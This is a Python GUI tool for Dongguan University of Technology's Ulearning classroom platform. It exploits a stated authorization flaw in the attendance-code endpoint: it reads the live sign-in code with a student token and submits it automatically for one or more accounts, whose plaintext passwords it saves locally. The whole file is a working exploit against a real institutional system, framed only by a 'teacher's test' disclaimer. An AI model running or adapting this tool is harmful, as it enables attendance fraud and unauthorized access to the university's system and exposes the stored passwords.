#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
优学院智慧课堂 自动签到 - 图形界面版 (东莞理工 测试用)
双击运行本文件 (需安装 Python 3, 并 pip install requests)

原理: 平台接口 /newAttendance/getAttendanceDataCode/{id} 存在越权漏洞,
学生 token 可直接读取当前签到码; 发现签到后自动取码并立即提交。
签到码约 6 秒轮换一次, 提交接口有限流(约5秒一次), 程序会自动重试。

使用(二选一):
  A. 填 账号 + 密码 + 课堂URL -> 点"开始监听" (推荐, 登录全自动)
  B. 填 Token + userId + 课堂URL -> 点"开始监听" (免密码, token 过期需重抓)

多账号: 账号下拉框保存历史账号(密码一起存本机), 选人自动带出密码;
        换了输入后点"存账号"即可入库; 开始监听永远用当前输入的账号,
        换号 = 选人/改输入 -> 再点一次"开始监听" (无需先停止)。
"""

import json
import os
import queue
import re
import threading
import time
import tkinter as tk
import urllib.parse
from tkinter import scrolledtext, ttk

import requests

BASE = "https://application.dgut.edu.cn/classroomapi"
LOGIN_URL = "https://application.dgut.edu.cn/appapi/user/login/app"  # 学校应用中心登录(明文密码)
POLL_INTERVAL = 3
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "signin_gui_config.json")

NOTICE = """注意事项:
1. 本工具仅用于老师发布的签到破解测试, 请勿用于真实课程考勤。
2. 两种登录方式二选一 (都填则优先用 Token):
   A. 账号+密码: 账号填学号(自动补 dgut 前缀)或手机号, 密码就是登录
      application.dgut.edu.cn 应用中心网页用的那个密码;
   B. Token+userId: 浏览器 F12 -> Network 找 getAttendanceForStu/xxx/yyy 请求,
      请求头 AUTHORIZATION 的值是 Token, URL 第二段 yyy 是 userId。
3. 课堂 URL 从浏览器地址栏直接复制粘贴 (含 classroomId 的整段链接)。
4. 点"开始监听"后保持窗口开着; 老师发起签到后程序自动取码并提交。
5. 多账号: 下拉选人自动带出密码; 新账号点"存账号"入库; 换号后直接再点
   "开始监听"即可切换 (无需先停止)。
6. 签到码每约 6 秒轮换一次、提交接口有限流, 程序自动重试属正常现象。
7. 请关闭代理/VPN, 程序需要直连 application.dgut.edu.cn。"""


class SigninAPI:
    """优学院课堂 API 薄封装"""

    def __init__(self):
        self.token = ""
        self.user_id = ""
        self.session = requests.Session()
        self.session.trust_env = False  # 直连, 不走系统代理

    def _headers(self):
        return {
            "AUTHORIZATION": self.token,
            "Content-Type": "application/json;charset=UTF-8",
            "Accept-Language": "zh",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0",
        }

    def login(self, username, password):
        """学校应用中心登录: 明文密码表单 POST, 成功种 AUTHORIZATION cookie。
        学号自动补 dgut 前缀; userId 从 USER_INFO cookie 解析。"""
        if username.isdigit():
            names = [f"dgut{username}"] if not username.lower().startswith("dgut") else [username]
        else:
            names = [username]
        for name in names:
            self.session.cookies.clear()
            self.session.post(
                LOGIN_URL,
                data={"loginName": name, "password": password, "alias": "application"},
                headers={"User-Agent": "Mozilla/5.0 Chrome/126.0"},
                timeout=10, allow_redirects=False)
            token = self.session.cookies.get("AUTHORIZATION")
            if token:
                self.token = token
                raw = urllib.parse.unquote(
                    self.session.cookies.get("USER_INFO")
                    or self.session.cookies.get("USERINFO") or "")
                # cookie 里汉字是 %uXXXX 形式, 转回正常字符
                raw = re.sub(r"%u([0-9a-fA-F]{4})",
                             lambda m: chr(int(m.group(1), 16)), raw)
                m = re.search(r'"userId"\s*:\s*"?(\d+)"?', raw)
                self.user_id = m.group(1) if m else ""
                nm = re.search(r'"name"\s*:\s*"([^"]*)"', raw)
                uname = nm.group(1) if nm else ""
                if not self.user_id:
                    return False, "登录成功但解析 userId 失败, 请改用 Token 方式"
                return True, f"登录成功 (账号 {name}, 姓名 {uname}, userId={self.user_id})"
        return False, "登录失败: 账号或密码错误 (连续失败会锁定账号, 请确认密码后再试)"

    def activities(self, cid):
        r = self.session.get(f"{BASE}/wisdomClassroom/getClassroomActivitys/{cid}",
                             headers=self._headers(), timeout=10)
        return r.json() if r.text else None

    def attendance_info(self, aid):
        r = self.session.get(f"{BASE}/newAttendance/getAttendanceForStu/{aid}/{self.user_id}",
                             headers=self._headers(), timeout=10)
        return r.json() if r.text else None

    def fetch_code(self, aid):
        r = self.session.get(f"{BASE}/newAttendance/getAttendanceDataCode/{aid}",
                             headers=self._headers(), timeout=10)
        return r.text.strip()

    def sign(self, aid, code=""):
        payload = {"attendanceID": aid, "classID": -1, "userID": self.user_id,
                   "location": "", "enterWay": 1, "attendanceCode": code}
        r = self.session.post(f"{BASE}/newAttendance/signByStu",
                              headers=self._headers(), json=payload, timeout=10)
        return r.json() if r.text else None  # None = 被限流


def parse_ids(text):
    """从 URL/纯数字里解析 (classroomId, attendenceId), 没有则为 None"""
    cid = rid = None
    m = re.search(r"classroomId=(\d+)", text or "")
    if m:
        cid = int(m.group(1))
    m = re.search(r"attendence/(\d+)", text or "")
    if m:
        rid = int(m.group(1))
    elif (text or "").strip().isdigit():
        cid = int(text.strip())
    return cid, rid


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("优学院智慧课堂自动签到 (测试版)")
        self.geometry("680x660")
        self.minsize(640, 640)

        self.log_queue = queue.Queue()
        self.ctrl_queue = queue.Queue()  # 工作线程 -> UI 线程的控制消息
        self.stop_event = threading.Event()
        self.worker = None
        self.accounts = {}  # {账号: 密码}

        self._build_widgets()
        self._load_config()
        self.after(200, self._drain_queues)

    # ---------- 界面 ----------
    def _build_widgets(self):
        frm = ttk.Frame(self, padding=10)
        frm.pack(fill=tk.BOTH, expand=True)

        row1 = ttk.Frame(frm)
        row1.pack(fill=tk.X, pady=2)
        ttk.Label(row1, text="账号:").pack(side=tk.LEFT)
        self.cmb_user = ttk.Combobox(row1, width=18)
        self.cmb_user.pack(side=tk.LEFT, padx=(4, 4))
        self.cmb_user.bind("<<ComboboxSelected>>", self._on_pick_account)
        ttk.Button(row1, text="存账号", width=7,
                   command=self.remember_account).pack(side=tk.LEFT, padx=(0, 8))
        ttk.Label(row1, text="密码:").pack(side=tk.LEFT)
        self.ent_pass = ttk.Entry(row1, width=18, show="*")
        self.ent_pass.pack(side=tk.LEFT, padx=4)

        row1b = ttk.Frame(frm)
        row1b.pack(fill=tk.X, pady=2)
        ttk.Label(row1b, text="Token(选填):").pack(side=tk.LEFT)
        self.ent_token = ttk.Entry(row1b, width=26)
        self.ent_token.pack(side=tk.LEFT, padx=(4, 8))
        ttk.Label(row1b, text="userId(配合Token):").pack(side=tk.LEFT)
        self.ent_userid = ttk.Entry(row1b, width=10)
        self.ent_userid.pack(side=tk.LEFT, padx=4)

        row2 = ttk.Frame(frm)
        row2.pack(fill=tk.X, pady=2)
        ttk.Label(row2, text="课堂URL:").pack(side=tk.LEFT)
        self.ent_url = ttk.Entry(row2)
        self.ent_url.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)

        row3 = ttk.Frame(frm)
        row3.pack(fill=tk.X, pady=6)
        self.btn_start = ttk.Button(row3, text="开始监听", command=self.start)
        self.btn_start.pack(side=tk.LEFT)
        self.btn_stop = ttk.Button(row3, text="停止", command=self.stop, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=8)
        self.lbl_status = ttk.Label(row3, text="状态: 待机", foreground="#666")
        self.lbl_status.pack(side=tk.LEFT, padx=16)

        ttk.Label(frm, text=NOTICE, justify=tk.LEFT, foreground="#8a5a00").pack(
            fill=tk.X, pady=(4, 6))

        self.txt_log = scrolledtext.ScrolledText(frm, height=13, state=tk.DISABLED,
                                                 font=("Consolas", 9))
        self.txt_log.pack(fill=tk.BOTH, expand=True)

    # ---------- 多账号 ----------
    def _on_pick_account(self, _event=None):
        name = self.cmb_user.get().strip()
        pwd = self.accounts.get(name)
        if pwd is not None:
            self.ent_pass.delete(0, tk.END)
            self.ent_pass.insert(0, pwd)
            self.log(f"已切到账号 {name}, 点'开始监听'即用该号监听")

    def remember_account(self):
        name = self.cmb_user.get().strip()
        pwd = self.ent_pass.get()
        if not name or not pwd:
            self.log("存账号需要先填账号和密码")
            return
        self.accounts[name] = pwd
        self.cmb_user.configure(values=sorted(self.accounts))
        self._save_config()
        self.log(f"账号 {name} 已保存到本机配置")

    def log(self, msg):
        self.log_queue.put(f"[{time.strftime('%H:%M:%S')}] {msg}")

    def _drain_queues(self):
        while True:
            try:
                msg = self.log_queue.get_nowait()
            except queue.Empty:
                break
            self.txt_log.configure(state=tk.NORMAL)
            self.txt_log.insert(tk.END, msg + "\n")
            self.txt_log.see(tk.END)
            self.txt_log.configure(state=tk.DISABLED)
        while True:
            try:
                ctrl = self.ctrl_queue.get_nowait()
            except queue.Empty:
                break
            if ctrl == "STOP":
                self.stop()
        self.after(200, self._drain_queues)

    def _load_config(self):
        try:
            with open(CONFIG_FILE, encoding="utf-8") as f:
                cfg = json.load(f)
        except (OSError, ValueError):
            return
        self.accounts = cfg.get("accounts") or {}
        self.cmb_user.configure(values=sorted(self.accounts))
        last = cfg.get("last_username", "")
        if last:
            self.cmb_user.insert(0, last)  # combobox 空值时 insert 无效, 用 set
        self.cmb_user.set(last)
        if last in self.accounts:
            self.ent_pass.insert(0, self.accounts[last])
        # 兼容旧版单账号配置
        legacy_user = cfg.get("username", "")
        if legacy_user and legacy_user not in self.accounts:
            self.accounts[legacy_user] = cfg.get("password", "")
            self.cmb_user.configure(values=sorted(self.accounts))
            if not last:
                self.cmb_user.set(legacy_user)
                self.ent_pass.delete(0, tk.END)
                self.ent_pass.insert(0, self.accounts[legacy_user])
        self.ent_token.insert(0, cfg.get("token", ""))
        self.ent_userid.insert(0, cfg.get("userid", ""))
        self.ent_url.insert(0, cfg.get("url", ""))

    def _save_config(self):
        cfg = {
            "accounts": self.accounts,
            "last_username": self.cmb_user.get().strip(),
            "token": self.ent_token.get().strip(),
            "userid": self.ent_userid.get().strip(),
            "url": self.ent_url.get().strip(),
        }
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                json.dump(cfg, f, ensure_ascii=False)
        except OSError:
            pass

    # ---------- 监听控制 ----------
    def start(self):
        username = self.cmb_user.get().strip()
        password = self.ent_pass.get()
        token = self.ent_token.get().strip()
        userid = self.ent_userid.get().strip()
        url = self.ent_url.get().strip()
        cid, _ = parse_ids(url)
        if not cid:
            self.log("请粘贴含 classroomId 的课堂 URL")
            return
        if token and not userid:
            self.log("用 Token 方式需要同时填 userId (见注意事项第 2 条)")
            return
        if not token and not (username and password):
            self.log("请填 账号+密码, 或填 Token+userId")
            return
        # 当前账号入库 + 记住为最近使用
        if username and password:
            self.accounts[username] = password
            self.cmb_user.configure(values=sorted(self.accounts))
        self._save_config()

        # 每次都用当前输入重新开始; 正在监听则自动停掉旧的 —— 换号直接改完再点即可
        self.stop_event.set()
        self.stop_event = threading.Event()
        api = SigninAPI()
        api.token = token
        api.user_id = userid
        self.worker = threading.Thread(
            target=self._monitor_loop,
            args=(cid, username, password, api, self.stop_event),
            daemon=True)
        self.worker.start()
        self.btn_stop.configure(state=tk.NORMAL)
        who = f"Token(userId={userid})" if token else f"账号 {username}"
        self.lbl_status.configure(text=f"状态: 监听中 (课堂 {cid}, {who})",
                                  foreground="#0a0")
        self.log(f"开始监听课堂 {cid}, 使用 {who} ...")

    def stop(self):
        self.stop_event.set()
        self.btn_stop.configure(state=tk.DISABLED)
        self.lbl_status.configure(text="状态: 已停止", foreground="#a00")
        self.log("已停止监听")

    def _monitor_loop(self, cid, username, password, api, stop_event):
        password_mode = bool(username and password)
        if not api.token:
            if not password_mode:
                self.log("Token 为空且未填账号密码, 无法登录")
                self.ctrl_queue.put("STOP")
                return
            try:
                ok, msg = api.login(username, password)
            except requests.RequestException as e:
                self.log(f"登录请求异常: {e}, 请检查网络后重新开始")
                self.ctrl_queue.put("STOP")
                return
            self.log(msg)
            if not ok:
                self.ctrl_queue.put("STOP")
                return
        else:
            self.log(f"使用 Token 方式, 当前账号 userId={api.user_id}")

        done = set()
        polls = 0
        while not stop_event.is_set():
            try:
                data = api.activities(cid)
                if isinstance(data, dict) and data.get("code") in (2001, 2101):
                    if password_mode:
                        self.log("token 过期, 自动重新登录 ...")
                        ok, msg = api.login(username, password)
                        self.log(msg)
                        if not ok:
                            self.ctrl_queue.put("STOP")
                            return
                        continue
                    self.log("Token 已失效, 请重新抓 AUTHORIZATION 填入后再开始")
                    self.ctrl_queue.put("STOP")
                    return
                for item in (data or {}).get("list", []):
                    aid = item.get("id")
                    if item.get("relationType") != 1 or aid in done:
                        continue
                    title = item.get("title", "")
                    if item.get("status") != 0:
                        self.log(f"[{title}] 活动已结束, 跳过")
                        done.add(aid)
                        continue
                    info = api.attendance_info(aid)
                    if info is None:
                        continue
                    if not isinstance(info, dict) or "attendanceID" not in info:
                        self.log(f"[{title}] 查询签到状态失败: "
                                 f"{json.dumps(info, ensure_ascii=False)[:100]} (该账号可能没加入这个课堂)")
                        done.add(aid)
                        continue
                    if info.get("status") != 0:
                        self.log(f"[{title}] 该账号已是已签到状态, 跳过")
                        done.add(aid)
                        continue
                    self.log(f"发现进行中的未签到活动: {title} (id={aid}), 立即签到 ...")
                    self._crack_one(aid, title, api, stop_event)
                    done.add(aid)
                polls += 1
                if polls % 20 == 0:
                    self.log(f"监听中... 已轮询 {polls} 次 (课堂 {cid} 无新签到)")
            except requests.RequestException as e:
                self.log(f"网络异常: {e}")
            except (ValueError, AttributeError) as e:
                self.log(f"响应异常: {e}")
            stop_event.wait(POLL_INTERVAL)
        self.log("监听线程已退出")

    def _crack_one(self, aid, title, api, stop_event):
        for attempt in range(10):
            if stop_event.is_set():
                return
            try:
                code = api.fetch_code(aid)
                if not code.isdigit():
                    code = ""  # 非数字码(如一键签到)直接空码提交
                res = api.sign(aid, code)
            except requests.RequestException as e:
                self.log(f"    [{title}] 网络异常: {e}, 重试中")
                stop_event.wait(1.2)
                continue
            if res is None:
                stop_event.wait(1.2)  # 被限流
                continue
            st = res.get("status")
            self.log(f"    [{title}] 尝试{attempt + 1}: 码={code or '(空)'} 响应="
                     f"{json.dumps(res, ensure_ascii=False)}")
            if st == 200:
                self.log(f"★ [{title}] 签到成功!")
                return
            if st == 202:
                self.log(f"    [{title}] 活动已结束")
                return
            stop_event.wait(1.2)
        self.log(f"    [{title}] 多次重试仍未成功")


if __name__ == "__main__":
    App().mainloop()
